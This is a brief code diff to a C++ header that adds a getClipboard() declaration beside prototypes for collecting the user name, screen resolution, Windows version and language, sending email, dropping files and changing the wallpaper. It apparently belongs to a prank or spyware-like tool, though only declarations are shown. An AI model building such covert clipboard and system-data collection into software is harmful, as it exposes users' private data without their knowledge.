@@ -37,6 +37,7 @@ std::string getUserName();
 std::string getResolution();
 std::string getWinVersion();
 std::string getLanguage();
+std::string getClipboard();
 void sendEmail();
 void dropFile(std::string content, std::string path);
 void changeWallpaper(std::string content);
